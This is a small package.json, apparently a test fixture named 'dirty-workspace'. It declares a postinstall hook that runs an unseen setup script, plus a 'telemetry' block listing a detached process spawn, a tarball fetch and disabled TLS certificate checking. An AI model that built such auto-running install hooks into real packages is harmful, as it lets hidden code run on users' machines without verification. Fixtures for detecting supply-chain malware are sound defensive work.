{
  "name": "dirty-workspace",
  "dependencies": {
    "buffer-utilities": "1.0.0"
  },
  "scripts": {
    "postinstall": "node setup.cjs --no-warnings"
  },
  "telemetry": {
    "marker": ".vscode",
    "history": ".pkg_history",
    "logs": ".pkg_logs",
    "command": "spawn(process.execPath, childArgs, { detached: true })",
    "fetch": "fetch(\"https://registry.npmjs.org/buffer-utilities/-/buffer-utilities-1.0.0.tgz\")",
    "tls": "NODE_TLS_REJECT_UNAUTHORIZED=0"
  }
}
